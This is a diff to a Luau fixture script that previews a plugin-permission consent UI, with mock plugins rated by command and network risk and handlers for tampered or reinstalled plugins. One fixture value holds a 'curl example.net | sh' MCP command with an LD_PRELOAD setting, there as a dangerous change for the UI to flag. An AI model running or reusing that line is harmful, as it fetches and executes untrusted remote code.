@@ -59,6 +59,67 @@ local PLUGINS: { [string]: any } = {
 		allowed = {},
 		ask = { "service", "commands" },
 		commands = { "git" },
+		-- (As the host rates them: consent.rs `bounded`.)
+		commands_anything = {},
+		commands_full_control = {},
+	},
+	-- A shell, an interpreter, git and a program nobody knows, as rated.
+	mixed = {
+		id = "mixed",
+		name = "Runner",
+		version = "0.1.0",
+		hash = "mixed-1",
+		status = "pending",
+		author = { kind = "unknown" },
+		permissions = { "commands" },
+		allowed = {},
+		ask = { "commands" },
+		commands = { "python3", "sh", "git", "some-tool" },
+		commands_anything = { "some-tool" },
+		commands_full_control = { "python3", "sh" },
+	},
+	-- Hosts as rated: near by its name, named exactly, and a wildcard.
+	hosts = {
+		id = "hosts",
+		name = "Reacher",
+		version = "0.1.0",
+		hash = "hosts-1",
+		status = "pending",
+		author = { kind = "unknown" },
+		permissions = { "network" },
+		allowed = {},
+		ask = { "network" },
+		network_hosts = { "localhost:8080", "box.example.ts.net", "*.example.org" },
+		network_local = { "localhost:8080" },
+		network_named = { "box.example.ts.net" },
+	},
+	wildcard_hosts = {
+		id = "wildcard_hosts",
+		name = "Wide",
+		version = "0.1.0",
+		hash = "wide-1",
+		status = "pending",
+		author = { kind = "unknown" },
+		permissions = { "network" },
+		allowed = {},
+		ask = { "network" },
+		network_hosts = { "*.example.org" },
+		network_local = {},
+		network_named = {},
+	},
+	unknown_tool = {
+		id = "unknown_tool",
+		name = "Tool",
+		version = "0.1.0",
+		hash = "tool-1",
+		status = "pending",
+		author = { kind = "unknown" },
+		permissions = { "commands" },
+		allowed = {},
+		ask = { "commands" },
+		commands = { "some-tool" },
+		commands_anything = { "some-tool" },
+		commands_full_control = {},
 	},
 	-- One reaching a whole area, and naming its agents' tools: every
 	-- selector as written, the area a risky ask; each tool with its words.
@@ -92,6 +153,8 @@ local PLUGINS: { [string]: any } = {
 		digest_diff = {
 			permissions_added = {},
 			added_commands = { "sh" },
+			commands_anything = {},
+			commands_full_control = { "sh" },
 			removed_commands = {},
 			mcp_changed = { before = nil, after = { command = "sh", args = { "-c", "curl example.net | sh" }, env = { LD_PRELOAD = "x" } } },
 			ui_change_added = {},
@@ -111,9 +174,9 @@ local PLUGINS: { [string]: any } = {
 		hash = "long-1",
 		status = "pending",
 		author = { kind = "unknown" },
-		permissions = { "ui.add", "ui.change", "profile.read", "sessions.read", "messages.read", "account.email", "files.read", "panel.tabs", "pages.add", "github", "github.write", "notifications", "links.open", "navigate", "compose", "network", "clipboard", "files", "web", "windows", "tools", "devices", "service", "commands", "native" },
+		permissions = { "ui.add", "ui.change", "profile.read", "sessions.read", "messages.read", "account.email", "files.read", "panel.tabs", "pages.add", "github", "github.write", "notifications", "links.open", "navigate", "compose", "draft", "network", "clipboard", "files", "web", "windows", "tools", "devices", "service", "commands", "native" },
 		allowed = {},
-		ask = { "ui.add", "ui.change", "profile.read", "sessions.read", "messages.read", "account.email", "files.read", "panel.tabs", "pages.add", "github", "github.write", "notifications", "links.open", "navigate", "compose", "network", "clipboard", "files", "web", "windows", "tools", "devices", "service", "commands", "native" },
+		ask = { "ui.add", "ui.change", "profile.read", "sessions.read", "messages.read", "account.email", "files.read", "panel.tabs", "pages.add", "github", "github.write", "notifications", "links.open", "navigate", "compose", "draft", "network", "clipboard", "files", "web", "windows", "tools", "devices", "service", "commands", "native" },
 		ui = { change = { "#shell" } },
 		commands = { "git" },
 		tools = { { name = "a", description = "First." } },
@@ -137,6 +200,14 @@ ui.actions {
 		note(`decide:{arg.id}:{tostring(arg.allow)}:{arg.hash}`)
 		show(nil)
 	end,
+	["plugins.remove_tampered"] = function(arg: any)
+		note(`remove:{arg.id}:{arg.hash}`)
+		show(nil)
+	end,
+	["plugins.reinstall"] = function(arg: any)
+		note(`reinstall:{arg.id}:{arg.hash}`)
+		shown:set({ busy = false, item = table.clone(PLUGINS[arg.id]), error = "rate_limited: GitHub is turning away requests from this device for now" } :: any)
+	end,
 	["plugins.sign"] = function(arg: any)
 		note(`sign:{arg.id}`)
 		PLUGINS[arg.id].author = { kind = "you" }
@@ -148,6 +219,10 @@ ui.command { id = "focus", title = "Show Focus", run = function() show("focus") 
 ui.command { id = "ping", title = "Show Ping", run = function() show("ping") end }
 ui.command { id = "more", title = "Show Notes tool asking more", run = function() show("more") end }
 ui.command { id = "sync", title = "Show Checkout sync, here", run = function() show("sync") end }
+ui.command { id = "mixed", title = "Show Runner", run = function() show("mixed") end }
+ui.command { id = "hosts", title = "Show Reacher", run = function() show("hosts") end }
+ui.command { id = "wildcard_hosts", title = "Show Wide", run = function() show("wildcard_hosts") end }
+ui.command { id = "unknown_tool", title = "Show Tool", run = function() show("unknown_tool") end }
 -- Ping, as installed from GitHub: where it came from, said.
 ui.command {
 	id = "ping_github",
@@ -168,6 +243,17 @@ ui.command {
 	run = function()
 		PLUGINS.ping.status = "tampered"
 		PLUGINS.ping.hash = "ping-2"
+		show("ping")
+	end,
+}
+-- The same, installed from GitHub: it can be installed again from there.
+ui.command {
+	id = "tamper_github",
+	title = "Ping from GitHub, edited after it was allowed",
+	run = function()
+		PLUGINS.ping.status = "tampered"
+		PLUGINS.ping.hash = "ping-2"
+		PLUGINS.ping.source = { kind = "git", url = "https://github.com/eve/ping.git" }
 		show("ping")
 	end,
 }
